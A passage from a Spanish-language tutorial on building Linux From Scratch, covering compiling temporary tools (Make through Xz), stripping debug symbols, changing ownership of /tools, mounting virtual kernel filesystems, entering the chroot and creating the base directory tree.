&lt;p&gt;Para la compilación de este paquete, haremos uso del paquete &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;make-4.3.tar.gz&lt;/code&gt;. Una vez descomprimido, nos meteremos dentro del directorio descomprimido y aplicaremos los siguientes comandos:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;./configure &lt;span class=&quot;nt&quot;&gt;--prefix&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/tools &lt;span class=&quot;nt&quot;&gt;--without-guile&lt;/span&gt;

make
make check
make &lt;span class=&quot;nb&quot;&gt;install&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Una vez hecho, retrocedemos un directorio y borramos el directorio principal de Make:&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/349jQ.png&quot; /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h5 id=&quot;compilación-patch&quot;&gt;Compilación Patch&lt;/h5&gt;

&lt;p&gt;Para la compilación de este paquete, haremos uso del paquete &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;patch-2.7.6.tar.xz&lt;/code&gt;. Una vez descomprimido, nos meteremos dentro del directorio descomprimido y aplicaremos los siguientes comandos:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;./configure &lt;span class=&quot;nt&quot;&gt;--prefix&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/tools

make
make check
make &lt;span class=&quot;nb&quot;&gt;install&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;En este paquete, a la hora de hacer un &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;make check&lt;/code&gt;, es posible que el campo &lt;strong&gt;XFAIL&lt;/strong&gt; devuelve 2 errores, esto es normal y no habrá de qué preocuparse.&lt;/p&gt;

&lt;p&gt;Una vez hecho, retrocedemos un directorio y borramos el directorio principal de Patch:&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/349k9.png&quot; /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h5 id=&quot;compilación-perl&quot;&gt;Compilación Perl&lt;/h5&gt;

&lt;p&gt;Para la compilación de este paquete, haremos uso del paquete &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;perl-5.30.1.tar.xz&lt;/code&gt;. Una vez descomprimido, nos meteremos dentro del directorio descomprimido y aplicaremos los siguientes comandos:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sh Configure &lt;span class=&quot;nt&quot;&gt;-des&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-Dprefix&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/tools &lt;span class=&quot;nt&quot;&gt;-Dlibs&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-lm&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-Uloclibpth&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-Ulocincpth&lt;/span&gt;

make
&lt;span class=&quot;nb&quot;&gt;cp&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; perl cpan/podlators/scripts/pod2man /tools/bin
&lt;span class=&quot;nb&quot;&gt;mkdir&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-pv&lt;/span&gt; /tools/lib/perl5/5.30.1
&lt;span class=&quot;nb&quot;&gt;cp&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-Rv&lt;/span&gt; lib/&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; /tools/lib/perl5/5.30.1
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Una vez hecho, retrocedemos un directorio y borramos el directorio principal de Perl:&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/349kE.png&quot; /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h5 id=&quot;compilación-python&quot;&gt;Compilación Python&lt;/h5&gt;

&lt;p&gt;Para la compilación de este paquete, haremos uso del paquete &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Python-3.8.1.tar.xz&lt;/code&gt;. Una vez descomprimido, nos meteremos dentro del directorio descomprimido y aplicaremos los siguientes comandos:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;sed&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'/def add_multiarch_paths/a \        return'&lt;/span&gt; setup.py
./configure &lt;span class=&quot;nt&quot;&gt;--prefix&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/tools &lt;span class=&quot;nt&quot;&gt;--without-ensurepip&lt;/span&gt;
make
make &lt;span class=&quot;nb&quot;&gt;install&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;Anotación&lt;/strong&gt;: Si al hacer un &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;make install&lt;/code&gt; en la fase final da un error, lo que habrá que hacer será volver a descomprimir el comprimido de Python y esta vez en el archivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;setup.py&lt;/code&gt;, nos iremos nosotros manualmente a la línea que pone &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;add_multiarch_paths&lt;/code&gt;. Una vez situados, justamente debajo de la función, correctamente tabulado pondremos la palabra &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;return&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Una vez hecho, retrocedemos un directorio y borramos el directorio principal de Python:&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/349mg.png&quot; /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h5 id=&quot;compilación-sed&quot;&gt;Compilación Sed&lt;/h5&gt;

&lt;p&gt;Para la compilación de este paquete, haremos uso del paquete &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sed-4.8.tar.xz&lt;/code&gt;. Una vez descomprimido, nos meteremos dentro del directorio descomprimido y aplicaremos los siguientes comandos:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;./configure &lt;span class=&quot;nt&quot;&gt;--prefix&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/tools
make
make check
make &lt;span class=&quot;nb&quot;&gt;install&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Una vez hecho, retrocedemos un directorio y borramos el directorio principal de Sed:&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/349mu.png&quot; /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h5 id=&quot;compilación-tar&quot;&gt;Compilación Tar&lt;/h5&gt;

&lt;p&gt;Para la compilación de este paquete, haremos uso del paquete &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tar-1.32.tar.xz&lt;/code&gt;. Una vez descomprimido, nos meteremos dentro del directorio descomprimido y aplicaremos los siguientes comandos:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;./configure &lt;span class=&quot;nt&quot;&gt;--prefix&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/tools
make
make check
make &lt;span class=&quot;nb&quot;&gt;install&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Una vez hecho, retrocedemos un directorio y borramos el directorio principal de Tar:&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/349n3.png&quot; /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h5 id=&quot;compilación-texinfo&quot;&gt;Compilación Texinfo&lt;/h5&gt;

&lt;p&gt;Para la compilación de este paquete, haremos uso del paquete &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;texinfo-6.7.tar.xz&lt;/code&gt;. Una vez descomprimido, nos meteremos dentro del directorio descomprimido y aplicaremos los siguientes comandos:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;./configure &lt;span class=&quot;nt&quot;&gt;--prefix&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/tools
make
make check
make &lt;span class=&quot;nb&quot;&gt;install&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Una vez hecho, retrocedemos un directorio y borramos el directorio principal de Texinfo:&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/349oM.png&quot; /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h5 id=&quot;compilación-xz&quot;&gt;Compilación Xz&lt;/h5&gt;

&lt;p&gt;Madre mía, último paquete a instalar… si señor, buen trabajo. Aún así prepárate, que luego vendrán muchos más.&lt;/p&gt;

&lt;p&gt;Para la compilación de este paquete, haremos uso del paquete &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;xz-5.2.4.tar.xz&lt;/code&gt;. Una vez descomprimido, nos meteremos dentro del directorio descomprimido y aplicaremos los siguientes comandos:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;./configure &lt;span class=&quot;nt&quot;&gt;--prefix&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/tools
make
make check
make &lt;span class=&quot;nb&quot;&gt;install&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Una vez hecho, retrocedemos un directorio y borramos el directorio principal de Xz:&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/349p5.png&quot; /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h4 id=&quot;stripping&quot;&gt;Stripping&lt;/h4&gt;

&lt;p&gt;Este apartado es totalmente opcional, irá destinado a eliminar elementos innecesarios. Pensemos en que los ejecutables y las bibliotecas construidas hasta ahora contienen aproximadamente unos 70 MB de símbolos de depuración innecesarios.&lt;/p&gt;

&lt;p&gt;Para eliminar estos símbolos, podemos ejecutar el siguiente comando:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;strip &lt;span class=&quot;nt&quot;&gt;--strip-debug&lt;/span&gt; /tools/lib/&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;
/usr/bin/strip &lt;span class=&quot;nt&quot;&gt;--strip-unneeded&lt;/span&gt; /tools/&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;,s&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;bin/&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Para salvar más espacio, eliminaremos las documentaciones y archivos innecesarios:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;rm&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-rf&lt;/span&gt; /tools/&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;,share&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;/&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;info,man,doc&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
find /tools/&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;lib,libexec&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-name&lt;/span&gt; &lt;span class=&quot;se&quot;&gt;\*&lt;/span&gt;.la &lt;span class=&quot;nt&quot;&gt;-delete&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/349pq.png&quot; /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;En este punto, toca hacer una nueva Snapshot antes de continuar:&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/349pt.png&quot; /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h4 id=&quot;cambio-de-propietario&quot;&gt;Cambio de Propietario&lt;/h4&gt;

&lt;p&gt;Actualmente, la ruta ‘&lt;em&gt;$LFS/tools&lt;/em&gt;’ tiene como propietario asignado al usuario &lt;strong&gt;lfs&lt;/strong&gt;, un usuario que existe sólo en el sistema host.&lt;/p&gt;

&lt;p&gt;Lo que haremos por el momento será cambiar el propietario y el grupo asignado de forma recursiva al usuario &lt;strong&gt;root&lt;/strong&gt;, de la siguiente forma:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;chown&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-R&lt;/span&gt; root:root &lt;span class=&quot;nv&quot;&gt;$LFS&lt;/span&gt;/tools
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;IMPORTANTE&lt;/strong&gt;: Esto hay que hacerlo como el usuario &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;root&lt;/code&gt;, por tanto, ejecutamos primero el comando &lt;strong&gt;exit&lt;/strong&gt; para salir de la sesión del usuario &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;lfs&lt;/code&gt;.&lt;/p&gt;

&lt;h1 id=&quot;construyendo-el-sistema-lfs&quot;&gt;Construyendo el sistema LFS&lt;/h1&gt;

&lt;h4 id=&quot;preparando-el-sistema-de-archivos-del-kernel-virtual&quot;&gt;Preparando el sistema de archivos del kernel virtual&lt;/h4&gt;
&lt;p&gt;Comenzaremos creando los directorios en los que se montarán los sistemas de archivos:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;mkdir&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-pv&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$LFS&lt;/span&gt;/&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;dev,proc,sys,run&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Cuando el kernel arranca el sistema, se requiere de la presencia de unos pocos nodos de dispositivo, en particular los dispositivos &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;console&lt;/code&gt; y &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nul&lt;/code&gt;. Estos nodos del dispositivo deben crearse en el disco duro para que estén disponibles antes de que se inicie &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;udevd&lt;/code&gt; y, además, cuando se inicie Linux &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;init=/bin/bash&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Podemos crear estos dispositivos ejecutando los siguientes comandos:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;mknod&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; 600 &lt;span class=&quot;nv&quot;&gt;$LFS&lt;/span&gt;/dev/console c 5 1
&lt;span class=&quot;nb&quot;&gt;mknod&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; 666 &lt;span class=&quot;nv&quot;&gt;$LFS&lt;/span&gt;/dev/null c 1 3
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Ya en este punto, crearemos un sistema de archivos virtual en el directorio &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/dev&lt;/code&gt; para permitir que los dispositivos se creen dinámicamente a medida que estos son detectados o accedidos:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mount &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--bind&lt;/span&gt; /dev &lt;span class=&quot;nv&quot;&gt;$LFS&lt;/span&gt;/dev
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/349qt.png&quot; /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h4 id=&quot;montaje-del-sistema-de-archivos-del-kernel-virtual&quot;&gt;Montaje del sistema de archivos del kernel virtual&lt;/h4&gt;

&lt;p&gt;En este punto, montaremos los sistemas de archivos del kernel virtual restantes:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mount &lt;span class=&quot;nt&quot;&gt;-vt&lt;/span&gt; devpts devpts &lt;span class=&quot;nv&quot;&gt;$LFS&lt;/span&gt;/dev/pts &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;5,mode&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;620
mount &lt;span class=&quot;nt&quot;&gt;-vt&lt;/span&gt; proc proc &lt;span class=&quot;nv&quot;&gt;$LFS&lt;/span&gt;/proc
mount &lt;span class=&quot;nt&quot;&gt;-vt&lt;/span&gt; sysfs sysfs &lt;span class=&quot;nv&quot;&gt;$LFS&lt;/span&gt;/sys
mount &lt;span class=&quot;nt&quot;&gt;-vt&lt;/span&gt; tmpfs tmpfs &lt;span class=&quot;nv&quot;&gt;$LFS&lt;/span&gt;/run
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;En algunos sistemas host, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/dev/shm&lt;/code&gt; es un enlace simbólico a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/run/shm&lt;/code&gt;. El &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tmpfs&lt;/code&gt; &lt;strong&gt;/run&lt;/strong&gt; fue montado arriba, por tanto en este caso… sólo es necesario crear un directorio:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-h&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$LFS&lt;/span&gt;/dev/shm &lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;then
  &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;mkdir&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-pv&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$LFS&lt;/span&gt;/&lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;readlink&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$LFS&lt;/span&gt;/dev/shm&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;fi&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/349qC.png&quot; /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h4 id=&quot;entrando-en-el-entorno-chroot&quot;&gt;Entrando en el entorno Chroot&lt;/h4&gt;

&lt;p&gt;A partir de aquí, ingresaremos al entorno chroot para comenzar a construir e instalar nuestro sistema Linux final.&lt;/p&gt;

&lt;p&gt;Como el usuario &lt;strong&gt;root&lt;/strong&gt;, ejecutaremos el siguiente comando:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;chroot&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$LFS&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; /tools/bin/env &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;HOME&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/root                  &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;TERM&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$TERM&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;                &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;PS1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'(lfs chroot) \u:\w\$ '&lt;/span&gt; &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;PATH&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/bin:/usr/bin:/sbin:/usr/sbin:/tools/bin &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
    /tools/bin/bash &lt;span class=&quot;nt&quot;&gt;--login&lt;/span&gt; +h
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Una vez ejecutado, deberíamos ver algo como esto:&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/349qP.png&quot; /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;Como vemos, en ‘&lt;em&gt;/sources&lt;/em&gt;’ deberíamos ver todos nuestros archivos comprimidos que habíamos obtenido del archivo &lt;strong&gt;wget-list&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;Si esto es así, podremos continuar.&lt;/p&gt;

&lt;h5 id=&quot;creación-de-directorios&quot;&gt;Creación de directorios&lt;/h5&gt;

&lt;p&gt;Antes de continuar, será necesario crear una estructura base para el sistema de archivos de nuestro sistema Linux. Crearemos un árbol estándar de directorios ejecutando los siguientes comandos:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;mkdir&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-pv&lt;/span&gt; /&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;bin,boot,etc/&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;opt,sysconfig&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;,home,lib/firmware,mnt,opt&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;mkdir&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-pv&lt;/span&gt; /&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;media/&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;floppy,cdrom&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;,sbin,srv,var&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;install&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-dv&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; 0750 /root
&lt;span class=&quot;nb&quot;&gt;install&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-dv&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; 1777 /tmp /var/tmp
&lt;span class=&quot;nb&quot;&gt;mkdir&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-pv&lt;/span&gt; /usr/&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;,local/&lt;span class=&quot;o&quot;&gt;}{&lt;/span&gt;bin,include,lib,sbin,src&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;mkdir&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-pv&lt;/span&gt; /usr/&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;,local/&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;share/&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;color,dict,doc,info,locale,man&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;mkdir&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt;  /usr/&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;,local/&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;share/&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;misc,terminfo,zoneinfo&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;mkdir&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt;  /usr/libexec
&lt;span class=&quot;nb&quot;&gt;mkdir&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-pv&lt;/span&gt; /usr/&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;,local/&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;share/man/man&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;1..8&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;mkdir&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt;  /usr/lib/pkgconfig

&lt;span class=&quot;k&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;uname&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;in
 &lt;/span&gt;x86_64&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;mkdir&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; /lib64 &lt;span class=&quot;p&quot;&gt;;;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;esac&lt;/span&gt;

